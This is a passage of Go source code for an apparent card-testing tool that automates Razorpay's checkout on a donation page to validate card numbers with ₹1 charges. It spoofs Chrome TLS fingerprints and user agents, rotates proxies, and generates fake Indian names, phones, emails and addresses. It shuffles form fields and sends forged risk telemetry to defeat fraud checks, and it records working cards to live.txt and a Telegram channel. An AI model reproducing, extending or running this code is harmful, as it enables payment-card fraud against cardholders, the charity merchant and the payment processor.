package main

// ════════════════════════════════════════════════════════════════════════
//  AUTO RAZORPAY — REWRITTEN & VERIFIED
//  Based on: live browser capture of pages.razorpay.com checkout flow
//  Captured page: https://pages.razorpay.com/BooksForAllDonation
//  Capture date:  2026-09-01
//
//  FULL CHECKOUT FLOW (as captured):
//  ─────────────────────────────────
//  1. GET  pages.razorpay.com/<slug>
//       → extracts: key_id (may be null), keyless_header, payment_link.id,
//                   payment_page_items[0].id, merchant data
//
//  2. POST api.razorpay.com/v1/payment_pages/<plink>/order
//       body: { notes:{name,comment}, line_items:[{payment_page_item_id, amount}] }
//       → extracts: order.id, order.amount, order.currency
//
//  3. GET  api.razorpay.com/v1/checkout/public
//       params: traffic_env=production, build=<BUILD>, build_v1=<BUILD_V1>,
//               checkout_v2=1, new_session=1, keyless_header=...,
//               rzp_device_id=..., unified_session_id=...
//       → extracts: session_token (window.session_token="...")
//
//  4. POST api.razorpay.com/v2/standard_checkout/preferences
//       params: x_entity_id=<order_id>, session_token=..., keyless_header=...
//       body:   { query:[{resource:"merchant"}, ...], query_params:{...}, action:"get" }
//       headers: x-session-token: <sessid>
//       → (response ignored, but MUST be called for session validity)
//
//  5. POST api.razorpay.com/v1/standard_checkout/checkout/order
//       params: key_id=..., session_token=..., keyless_header=...
//       body:   form-urlencoded with notes, contact, email, currency,
//               _[integration]=payment_pages, _[shield][...], method=card, etc.
//
//  6. RISK POST lumberjack.razorpay.com/v2/m/logz?key_id=...  (gzip JSON)
//       events: risk:risk_scan, risk:risk_mutation, risk:risk_scan_complete
//       → REQUIRED — without this every payment fails with payment_risk_check_failed
//
//  7. POST api.razorpay.com/v1/standard_checkout/payments/create/checkout
//       params: key_id=..., session_token=..., keyless_header=...
//       body:   form-urlencoded with full card data + all _[...] fields
//       → extracts: payment_id (or error.metadata.payment_id)
//
//  8a. POST api.razorpay.com/pg_router/v1/payments/<pid>/authenticate  (empty body)
//  8b. POST api.razorpay.com/pg_router/v1/payments/<pidClean>/authenticate
//       body: browser[...], auth_step=3ds2Auth
//
//  9.  GET  api.razorpay.com/v1/standard_checkout/payments/<pid>
//       params: key_id=..., session_token=..., keyless_header=...
//       → poll status: authorized/captured → "charged"
//
//  10. POST api.razorpay.com/v1/standard_checkout/payments/<pid>/cancel
//       → if still pending after poll, cancel to free the order
// ════════════════════════════════════════════════════════════════════════

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"crypto/tls"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

// ── Build hashes ──────────────────────────────────────────────────────
// Fetch from checkout.razorpay.com/v1/checkout.js (look for `g=` var)
// Verify: curl -s https://checkout.razorpay.com/v1/checkout.js | grep -oE 'g="[a-f0-9]{40}"' | head -3
const (
	BUILD    = "11d0fb998d397102511c6c304e4f8565aaad29b3" // main checkout bundle hash
	BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f" // v1 bundle hash
	PORT     = 7070
)

// ── Default charge amount ─────────────────────────────────────────────
const (
	defaultAmount   = 1.0   // ₹1.00
	defaultCurrency = "INR"
)

// ─────────────────────────────────────────────────────────────────────
//  TYPES
// ─────────────────────────────────────────────────────────────────────

type parsedProxy struct {
	raw    string
	parsed *url.URL
}

// CheckResult is the JSON response for /check
type CheckResult struct {
	Status            string  `json:"status"`
	Message           string  `json:"message"`
	Proxy             string  `json:"proxy"`
	ProxyStatus       string  `json:"proxy_status"`
	Amount            float64 `json:"amount"`
	Currency          string  `json:"currency"`
	RequestedAmount   float64 `json:"requested_amount"`
	RequestedCurrency string  `json:"requested_currency"`
	ExchangeRate      float64 `json:"exchange_rate,omitempty"`
}

// ─────────────────────────────────────────────────────────────────────
//  GLOBAL STATE
// ─────────────────────────────────────────────────────────────────────

var (
	razorpayURLs []string
	urlIndex     uint64
	proxyIndex   uint64

	globalProxyList []parsedProxy

	maxConcurrentChecks = 120
	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)

	shuttingDown atomic.Bool

	liveLogMutex sync.Mutex
	liveFilePath = "live.txt"

	deadProxyMutex   sync.Mutex
	deadProxies      = make(map[string]time.Time)
	deadProxyTTL     = 3 * time.Minute
	deadProxySweepAt time.Time

	sharedHTTPClient = &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        20,
			MaxIdleConnsPerHost: 5,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}

	liveWriteChan  = make(chan string, 500)
	tgNotifyChan   = make(chan CheckResult, 200)
	sessionTokenRe = regexp.MustCompile(`(?:window\.session_token\s*=\s*"|session_token["']\s*:\s*["'])([A-Za-z0-9_\-\.]+)`)
)

// ─────────────────────────────────────────────────────────────────────
//  PROXY HELPERS
// ─────────────────────────────────────────────────────────────────────


// tlsConnWrapper wraps a utls.UConn and satisfies the tls.Conn-like interface
// that http2.Transport needs (ConnectionState returning crypto/tls.ConnectionState).
type tlsConnWrapper struct {
	*utls.UConn
}

func (w *tlsConnWrapper) ConnectionState() tls.ConnectionState {
	cs := w.UConn.ConnectionState()
	return tls.ConnectionState{
		Version:                     cs.Version,
		HandshakeComplete:           cs.HandshakeComplete,
		ServerName:                  cs.ServerName,
		NegotiatedProtocol:          cs.NegotiatedProtocol,
		NegotiatedProtocolIsMutual:  cs.NegotiatedProtocolIsMutual,
		CipherSuite:                 cs.CipherSuite,
		PeerCertificates:            cs.PeerCertificates,
		VerifiedChains:              cs.VerifiedChains,
		SignedCertificateTimestamps: cs.SignedCertificateTimestamps,
		OCSPResponse:                cs.OCSPResponse,
	}
}

// smartTransport auto-selects H1 or H2 based on ALPN negotiation.
type smartTransport struct {
	h1   *http.Transport
	h2   *http2.Transport
	dial func(ctx context.Context, network, addr string) (net.Conn, string, error)
	cache sync.Map // addr -> "h2"|"http/1.1"
}

func (s *smartTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	addr := req.URL.Host
	if !strings.Contains(addr, ":") {
		if req.URL.Scheme == "https" {
			addr += ":443"
		} else {
			addr += ":80"
		}
	}
	// Check cached protocol — avoid extra probe connections
	if v, ok := s.cache.Load(addr); ok {
		if v.(string) == "h2" {
			return s.h2.RoundTrip(req)
		}
		return s.h1.RoundTrip(req)
	}
	// Buffer the request body so it can be replayed on H1 fallback
	var bodyBuf []byte
	if req.Body != nil && req.Body != http.NoBody {
		var readErr error
		bodyBuf, readErr = io.ReadAll(req.Body)
		req.Body.Close()
		if readErr != nil {
			return nil, readErr
		}
		req.Body = io.NopCloser(bytes.NewReader(bodyBuf))
	}
	// Try H2 first; if it fails with a protocol error, fall back to H1
	resp, err := s.h2.RoundTrip(req)
	if err == nil {
		s.cache.Store(addr, "h2")
		return resp, nil
	}
	// If h2 error looks like protocol mismatch, try h1 with fresh body
	errStr := err.Error()
	if strings.Contains(errStr, "unexpected EOF") ||
		strings.Contains(errStr, "frame payload") ||
		strings.Contains(errStr, "PROTOCOL_ERROR") ||
		strings.Contains(errStr, "http2: ") ||
		strings.Contains(errStr, "ContentLength") {
		if bodyBuf != nil {
			req.Body = io.NopCloser(bytes.NewReader(bodyBuf))
		}
		resp2, err2 := s.h1.RoundTrip(req)
		if err2 == nil {
			s.cache.Store(addr, "http/1.1")
			return resp2, nil
		}
		return nil, err2
	}
	return nil, err
}



func getNextURL() string {
	if len(razorpayURLs) == 0 {
		return "https://pages.razorpay.com/BooksForAllDonation"
	}
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

const proxyScheme = "http"

func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		host := parts[0]
		port := parts[1]
		user := url.QueryEscape(parts[2])
		pass := url.QueryEscape(parts[3])
		return fmt.Sprintf("%s://%s:%s@%s:%s", proxyScheme, user, pass, host, port)
	}
	return proxyScheme + "://" + raw
}

func loadProxies(path string) []parsedProxy {
	var proxies []parsedProxy
	data, err := os.ReadFile(path)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("loadProxies: %v", err)
		}
		return proxies
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		formatted := formatProxy(line)
		if formatted == "" {
			continue
		}
		pURL, err := url.Parse(formatted)
		if err != nil {
			log.Printf("loadProxies: skipping %q: %v", line, err)
			continue
		}
		proxies = append(proxies, parsedProxy{raw: formatted, parsed: pURL})
	}
	return proxies
}

func extractProxyHost(raw string) string {
	host := raw
	if idx := strings.LastIndex(host, "@"); idx != -1 {
		host = host[idx+1:]
	}
	if idx := strings.Index(host, "://"); idx != -1 {
		host = host[idx+3:]
	}
	if idx := strings.Index(host, ":"); idx != -1 {
		host = host[:idx]
	}
	if idx := strings.IndexAny(host, "/?"); idx != -1 {
		host = host[:idx]
	}
	return strings.ToLower(strings.TrimSpace(host))
}

var torOrBadHosts = []string{
	"tor", "pl-tor", "exit", "relay",
	"datacenter", ".aws", "azure", "gcp",
	"linode", "digitalocean", "vultr",
	"hetzner", "ovh", "contabo", "vps",
	"proxy", "vpn", "res-", "res.",
	"socks", "tunnel", "anonym",
}

func isBadProxyHost(raw string) bool {
	host := extractProxyHost(raw)
	if host == "" {
		return true
	}
	for _, bad := range torOrBadHosts {
		if strings.Contains(host, bad) {
			return true
		}
	}
	return false
}

func markProxyDead(proxyRaw string) {
	if proxyRaw == "" {
		return
	}
	deadProxyMutex.Lock()
	deadProxies[proxyRaw] = time.Now().Add(deadProxyTTL)
	if time.Since(deadProxySweepAt) > 5*time.Minute {
		now := time.Now()
		for k, v := range deadProxies {
			if now.After(v) {
				delete(deadProxies, k)
			}
		}
		deadProxySweepAt = now
	}
	deadProxyMutex.Unlock()
}

func isProxyDead(proxyRaw string) bool {
	if proxyRaw == "" {
		return false
	}
	deadProxyMutex.Lock()
	expiry, ok := deadProxies[proxyRaw]
	deadProxyMutex.Unlock()
	if !ok {
		return false
	}
	if time.Now().After(expiry) {
		deadProxyMutex.Lock()
		delete(deadProxies, proxyRaw)
		deadProxyMutex.Unlock()
		return false
	}
	return true
}

func getNextProxy(proxyList []parsedProxy) *parsedProxy {
	n := uint64(len(proxyList))
	if n == 0 {
		return nil
	}
	start := atomic.AddUint64(&proxyIndex, 1) - 1
	for i := uint64(0); i < n; i++ {
		p := &proxyList[(start+i)%n]
		if isProxyDead(p.raw) || isBadProxyHost(p.raw) {
			continue
		}
		return p
	}
	return nil
}

func loadSites(path string) []string {
	var sites []string
	data, err := os.ReadFile(path)
	if err != nil {
		return sites
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			sites = append(sites, line)
		}
	}
	return sites
}

// ─────────────────────────────────────────────────────────────────────
//  RANDOM HELPERS
// ─────────────────────────────────────────────────────────────────────

func randInt(min, max int) int {
	if min >= max {
		return min
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min
	}
	return int(n.Int64()) + min
}

// Chrome UA strings — updated to match real Chrome 124-126 UA pool
var uaPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}

func genUA() string {
	return uaPool[randInt(0, len(uaPool)-1)]
}

// genIndianPhone generates a random Indian mobile number (+91XXXXXXXXXX)
func genIndianPhone() string {
	prefixes := []string{"6", "7", "8", "9"}
	prefix := prefixes[randInt(0, len(prefixes)-1)]
	number := fmt.Sprintf("+91%s%09d", prefix, randInt(100000000, 999999999))
	return number
}

func genEmail() string {
	names := []string{"rahul", "priya", "amit", "neha", "vikram", "sunita", "raj", "pooja", "ankit", "deepa"}
	domains := []string{"gmail.com", "yahoo.co.in", "outlook.com", "hotmail.com"}
	name := names[randInt(0, len(names)-1)]
	domain := domains[randInt(0, len(domains)-1)]
	return fmt.Sprintf("%s%d@%s", name, randInt(100, 9999), domain)
}

func genName() string {
	first := []string{"Rahul", "Priya", "Amit", "Neha", "Vikram", "Sunita", "Raj", "Pooja", "Ankit", "Deepa"}
	last := []string{"Sharma", "Verma", "Gupta", "Singh", "Kumar", "Patel", "Joshi", "Mehta", "Nair", "Rao"}
	return first[randInt(0, len(first)-1)] + " " + last[randInt(0, len(last)-1)]
}


// genIndianAddress returns a random Indian billing address tuple
// (line1, city, state, postalCode)
func genIndianAddress() (line1, city, state, postalCode string) {
	type cityInfo struct {
		line1      string
		city       string
		state      string
		postalCode string
	}
	cities := []cityInfo{
		{"123 MG Road", "Mumbai", "Maharashtra", "400001"},
		{"45 Connaught Place", "New Delhi", "Delhi", "110001"},
		{"78 Brigade Road", "Bengaluru", "Karnataka", "560001"},
		{"12 Anna Salai", "Chennai", "Tamil Nadu", "600002"},
		{"33 Park Street", "Kolkata", "West Bengal", "700016"},
		{"56 Banjara Hills", "Hyderabad", "Telangana", "500034"},
		{"99 Ashram Road", "Ahmedabad", "Gujarat", "380009"},
		{"17 Civil Lines", "Jaipur", "Rajasthan", "302006"},
		{"8 Hazratganj", "Lucknow", "Uttar Pradesh", "226001"},
		{"62 FC Road", "Pune", "Maharashtra", "411004"},
	}
	c := cities[randInt(0, len(cities)-1)]
	return c.line1, c.city, c.state, c.postalCode
}

func getBrand(cc string) string {
	if len(cc) < 1 {
		return "unknown"
	}
	switch cc[0] {
	case '4':
		return "visa"
	case '5':
		return "mastercard"
	case '3':
		if len(cc) > 1 && (cc[1] == '4' || cc[1] == '7') {
			return "amex"
		}
		return "jcb"
	case '6':
		return "discover"
	}
	return "unknown"
}

func findBetween(content, start, end string) string {
	s := strings.Index(content, start)
	if s == -1 {
		return ""
	}
	s += len(start)
	e := strings.Index(content[s:], end)
	if e == -1 {
		return ""
	}
	return content[s : s+e]
}

func extractJSONVar(content, varName string) string {
	patterns := []string{
		`var ` + varName + ` = `,
		`var ` + varName + `=`,
		`window.` + varName + ` = `,
		`window.` + varName + `=`,
		`"` + varName + `":`,
	}
	for _, pattern := range patterns {
		idx := strings.Index(content, pattern)
		if idx == -1 {
			continue
		}
		start := idx + len(pattern)
		// Find the matching { ... } block
		if start >= len(content) || content[start] != '{' {
			continue
		}
		depth := 0
		inStr := false
		escaped := false
		for i := start; i < len(content); i++ {
			c := content[i]
			if escaped {
				escaped = false
				continue
			}
			if c == '\\' && inStr {
				escaped = true
				continue
			}
			if c == '"' {
				inStr = !inStr
				continue
			}
			if inStr {
				continue
			}
			if c == '{' {
				depth++
			} else if c == '}' {
				depth--
				if depth == 0 {
					return content[start : i+1]
				}
			}
		}
	}
	return ""
}

// ─────────────────────────────────────────────────────────────────────
//  DEVICE / SESSION ID GENERATORS
// ─────────────────────────────────────────────────────────────────────

// generateRzpDeviceID returns (deviceID, fhash)
// deviceID: random 128-bit hex
// fhash:    SHA1 of a fingerprint seed — matches what checkout.js sends
func generateRzpDeviceID() (string, string) {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	deviceID := hex.EncodeToString(b)

	seed := fmt.Sprintf("chrome|windows|1920x1080|%d", time.Now().UnixMilli()%100000)
	h := sha1.New()
	h.Write([]byte(seed))
	fhash := hex.EncodeToString(h.Sum(nil))
	return deviceID, fhash
}

// generateRzpSessionID returns a UUID-like session ID
func generateRzpSessionID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// shuffleFormValues returns a copy of v with keys in random order
// (Razorpay risk engine checks field ordering patterns)
func shuffleFormValues(v url.Values) url.Values {
	keys := make([]string, 0, len(v))
	for k := range v {
		keys = append(keys, k)
	}
	// Fisher-Yates shuffle
	for i := len(keys) - 1; i > 0; i-- {
		j := randInt(0, i)
		keys[i], keys[j] = keys[j], keys[i]
	}
	result := url.Values{}
	for _, k := range keys {
		result[k] = v[k]
	}
	return result
}

// ─────────────────────────────────────────────────────────────────────
//  CUSTOM HTTP CLIENT (uTLS — Chrome TLS fingerprint)
// ─────────────────────────────────────────────────────────────────────

type FetchResponse struct {
	StatusCode int
	Headers    http.Header
	Body       []byte
}

func (r *FetchResponse) Text() string {
	return string(r.Body)
}

type CustomFetch struct {
	client  *http.Client
	ua      string
	reqID   string
	proxyRaw string
}

// bufConn wraps net.Conn to replay a buffered prefix before reading the wire
type bufConn struct {
	prefix []byte
	offset int
	Conn   net.Conn
}

func (b *bufConn) Read(p []byte) (int, error) {
	if b.offset < len(b.prefix) {
		n := copy(p, b.prefix[b.offset:])
		b.offset += n
		return n, nil
	}
	return b.Conn.Read(p)
}
func (b *bufConn) Write(p []byte) (int, error)        { return b.Conn.Write(p) }
func (b *bufConn) Close() error                       { return b.Conn.Close() }
func (b *bufConn) LocalAddr() net.Addr                { return b.Conn.LocalAddr() }
func (b *bufConn) RemoteAddr() net.Addr               { return b.Conn.RemoteAddr() }
func (b *bufConn) SetDeadline(t time.Time) error      { return b.Conn.SetDeadline(t) }
func (b *bufConn) SetReadDeadline(t time.Time) error  { return b.Conn.SetReadDeadline(t) }
func (b *bufConn) SetWriteDeadline(t time.Time) error { return b.Conn.SetWriteDeadline(t) }

func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*CustomFetch, error) {
	jar, _ := cookiejar.New(nil)

	parseChromeMajor := func(ua string) int {
		idx := strings.Index(ua, "Chrome/")
		if idx == -1 {
			return 124
		}
		parts := strings.Split(ua[idx+7:], ".")
		if len(parts) < 1 {
			return 124
		}
		v, _ := strconv.Atoi(parts[0])
		if v < 100 {
			return 124
		}
		return v
	}

	chromeMajor := parseChromeMajor(ua)
	var helloID utls.ClientHelloID
	switch {
	case chromeMajor >= 126:
		helloID = utls.HelloChrome_Auto
	case chromeMajor >= 124:
		helloID = utls.HelloChrome_120
	default:
		helloID = utls.HelloChrome_Auto
	}


	// utlsDial dials raw TCP (direct or via proxy CONNECT) and performs uTLS handshake
	// with ALPN ["h2","http/1.1"] so server picks its preferred protocol.
	utlsDial := func(ctx context.Context, network, addr string, protos []string) (net.Conn, string, error) {
		host, _, _ := net.SplitHostPort(addr)
		utlsCfg := &utls.Config{
			ServerName: host,
			NextProtos: protos,
		}
		var rawConn net.Conn
		var err error
		dialer := &net.Dialer{Timeout: 20 * time.Second}
		if proxyParsedURL != nil {
			rawConn, err = dialer.DialContext(ctx, "tcp", proxyParsedURL.Host)
			if err != nil {
				return nil, "", fmt.Errorf("proxy dial: %w", err)
			}
			connectReq := &http.Request{
				Method: "CONNECT",
				URL:    &url.URL{Opaque: addr},
				Host:   addr,
				Header: http.Header{"User-Agent": []string{ua}},
			}
			if proxyParsedURL.User != nil {
				pw, _ := proxyParsedURL.User.Password()
				creds := base64.StdEncoding.EncodeToString([]byte(proxyParsedURL.User.Username() + ":" + pw))
				connectReq.Header.Set("Proxy-Authorization", "Basic "+creds)
			}
			_ = connectReq.Write(rawConn)
			bufR := bufio.NewReader(rawConn)
			resp, err := http.ReadResponse(bufR, connectReq)
			if err != nil { rawConn.Close(); return nil, "", err }
			resp.Body.Close()
			if resp.StatusCode != 200 { rawConn.Close(); return nil, "", fmt.Errorf("CONNECT %d", resp.StatusCode) }
			leftover := bufR.Buffered()
			prefix := make([]byte, leftover)
			bufR.Read(prefix)
			rawConn = &bufConn{prefix: prefix, Conn: rawConn}
		} else {
			rawConn, err = dialer.DialContext(ctx, network, addr)
			if err != nil {
				return nil, "", err
			}
		}
		uConn := utls.UClient(rawConn, utlsCfg, helloID)
		uConn.SetDeadline(time.Now().Add(20 * time.Second))
		if err := uConn.Handshake(); err != nil {
			rawConn.Close()
			return nil, "", fmt.Errorf("TLS handshake: %w", err)
		}
		uConn.SetDeadline(time.Time{})
		proto := uConn.ConnectionState().NegotiatedProtocol
		return &tlsConnWrapper{uConn}, proto, nil
	}

	// h1Transport handles HTTP/1.1 via uTLS
	h1Transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, _, err := utlsDial(ctx, network, addr, []string{"http/1.1"})
			return conn, err
		},
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 3,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  true,
	}

	// h2Transport handles HTTP/2 via uTLS with h2 ALPN
	h2Transport := &http2.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
			conn, _, err := utlsDial(ctx, network, addr, []string{"h2"})
			return conn, err
		},
		DisableCompression: true,
	}

	// smartTransport: negotiates ALPN and routes to correct transport
	transport := &smartTransport{
		h1: h1Transport,
		h2: h2Transport,
		dial: func(ctx context.Context, network, addr string) (net.Conn, string, error) {
			return utlsDial(ctx, network, addr, []string{"h2", "http/1.1"})
		},
	}

	reqID := func() string {
		b := make([]byte, 3)
		rand.Read(b)
		return hex.EncodeToString(b)
	}()

	return &CustomFetch{
		client:   &http.Client{Jar: jar, Transport: transport, Timeout: 30 * time.Second},
		ua:       ua,
		reqID:    reqID,
		proxyRaw: proxyRaw,
	}, nil
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, err
	}

	// Base headers that match real Chrome checkout.js requests
	req.Header.Set("User-Agent", f.ua)
	req.Header.Set("Accept-Language", "en-IN,en-GB;q=0.9,en;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var reader io.Reader = resp.Body
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gr, err := gzip.NewReader(resp.Body)
		if err != nil {
			return nil, fmt.Errorf("gzip: %w", err)
		}
		defer gr.Close()
		reader = gr
	case "deflate":
		// handled by http.Transport automatically
	}

	bodyBytes, err := io.ReadAll(io.LimitReader(reader, 4<<20)) // 4 MB limit
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}

	return &FetchResponse{
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
		Body:       bodyBytes,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	data, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = map[string]string{}
	}
	headers["Content-Type"] = "application/json"
	return f.DoFetch(targetURL, "POST", headers, bytes.NewReader(data))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	encoded := formData.Encode()
	if headers == nil {
		headers = map[string]string{}
	}
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(encoded))
}

// ─────────────────────────────────────────────────────────────────────
//  RAZORPAY PAGE DATA RESOLVER
// ─────────────────────────────────────────────────────────────────────

// resolveRazorpayInitData fetches the payment page and extracts the `var data = {...}` JSON.
// Supports: pages.razorpay.com/<slug>  and  razorpay.me/@slug
// Returns: (initData, proxyStatus_or_resolvedURL, error)
func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw string) (map[string]interface{}, string, error) {
	isRzpMe := strings.Contains(targetURL, "razorpay.me/")

	if isRzpMe {
		// razorpay.me flow: follow redirect → try API
		resp, err := fetch.Get(targetURL, map[string]string{
			"Accept":                    "text/html,application/xhtml+xml,*/*",
			"Sec-Fetch-Dest":            "document",
			"Sec-Fetch-Mode":            "navigate",
			"Sec-Fetch-Site":            "none",
			"Upgrade-Insecure-Requests": "1",
		})
		if err != nil {
			return nil, classifyProxyError(err), fmt.Errorf("razorpay.me fetch: %w", err)
		}
		if resp.StatusCode == 402 || resp.StatusCode == 404 {
			return nil, "LIVE", fmt.Errorf("Payment link expired/inactive (HTTP %d)", resp.StatusCode)
		}
		// Try to extract slug and hit the API
		slug := ""
		if idx := strings.Index(targetURL, "razorpay.me/"); idx != -1 {
			rest := targetURL[idx+len("razorpay.me/"):]
			rest = strings.TrimPrefix(rest, "@")
			if idx2 := strings.IndexAny(rest, "/?"); idx2 != -1 {
				rest = rest[:idx2]
			}
			slug = rest
		}
		if slug != "" {
			apiURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s?expand[]=payment_page_items", slug)
			apiResp, err := fetch.Get(apiURL, map[string]string{
				"Accept": "application/json",
				"Origin": "https://razorpay.me",
			})
			if err == nil && apiResp.StatusCode == 200 {
				var apiData map[string]interface{}
				if json.Unmarshal(apiResp.Body, &apiData) == nil {
					return buildInitDataFromLinkAPI(apiData, resp.Text()), "", nil
				}
			}
		}
		// Fall back to HTML extraction
		if data := tryExtractFromHTML(resp.Text()); data != nil {
			return data, "", nil
		}
		return nil, "LIVE", fmt.Errorf("Could not extract data from razorpay.me page (slug: %s)", slug)
	}

	// Standard pages.razorpay.com flow
	resp, err := fetch.Get(targetURL, map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
		"Upgrade-Insecure-Requests": "1",
	})
	if err != nil {
		return nil, classifyProxyError(err), fmt.Errorf("page fetch: %w", err)
	}

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		return nil, "BLOCKED", fmt.Errorf("WAF blocked page fetch (HTTP %d)", resp.StatusCode)
	}
	if resp.StatusCode == 404 {
		return nil, "LIVE", fmt.Errorf("Payment page not found (404)")
	}
	if resp.StatusCode >= 400 {
		return nil, "LIVE", fmt.Errorf("Page fetch failed (HTTP %d)", resp.StatusCode)
	}

	text := resp.Text()
	if data := tryExtractFromHTML(text); data != nil {
		return data, "", nil
	}
	return nil, "LIVE", fmt.Errorf("var data not found in page HTML (page len=%d)", len(text))
}

func tryExtractFromHTML(html string) map[string]interface{} {
	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig",
		"checkoutData", "initialData", "__INITIAL_STATE__", "window.__data__", "rzpData"}
	for _, name := range patterns {
		raw := extractJSONVar(html, name)
		if raw == "" {
			continue
		}
		var result map[string]interface{}
		if err := json.Unmarshal([]byte(raw), &result); err == nil && len(result) > 0 {
			return result
		}
	}
	return nil
}

func buildInitDataFromLinkAPI(apiData map[string]interface{}, pageHTML string) map[string]interface{} {
	// Extract key_id from page HTML
	keyID := ""
	if idx := strings.Index(pageHTML, `key_id:`); idx != -1 {
		val := strings.TrimSpace(pageHTML[idx+7:])
		val = strings.TrimPrefix(val, `"`)
		if end := strings.Index(val, `"`); end != -1 {
			keyID = val[:end]
		}
	}

	plObj := map[string]interface{}{
		"id":       getStringFromMap(apiData, "id"),
		"amount":   apiData["amount"],
		"currency": apiData["currency"],
		"status":   apiData["status"],
	}
	if items, ok := apiData["payment_page_items"].([]interface{}); ok && len(items) > 0 {
		plObj["payment_page_items"] = items
	}

	result := map[string]interface{}{
		"key_id":       keyID,
		"payment_link": plObj,
	}

	// Extract keyless_header from page HTML if present
	if idx := strings.Index(pageHTML, "keyless_header"); idx != -1 {
		sub := pageHTML[idx:]
		if kh := findBetween(sub, `"`, `"`); kh != "" {
			result["keyless_header"] = kh
		}
	}
	return result
}

// classifyProxyError maps network errors to proxy status strings
func classifyProxyError(err error) string {
	if err == nil {
		return "LIVE"
	}
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "connection refused") ||
		strings.Contains(msg, "no route to host") ||
		strings.Contains(msg, "i/o timeout") ||
		strings.Contains(msg, "eof") ||
		strings.Contains(msg, "proxy") {
		return "DEAD"
	}
	if strings.Contains(msg, "407") || strings.Contains(msg, "auth") {
		return "DEAD"
	}
	return "LIVE"
}

// ─────────────────────────────────────────────────────────────────────
//  CURRENCY CONVERSION
// ─────────────────────────────────────────────────────────────────────

// toSmallestUnit converts major currency units to smallest (e.g. ₹1.00 → 100 paise)
func toSmallestUnit(amount float64, currency string) int64 {
	// Zero-decimal currencies (no paise/cents)
	zeroDec := map[string]bool{"JPY": true, "KRW": true, "VND": true, "IDR": true, "UGX": true}
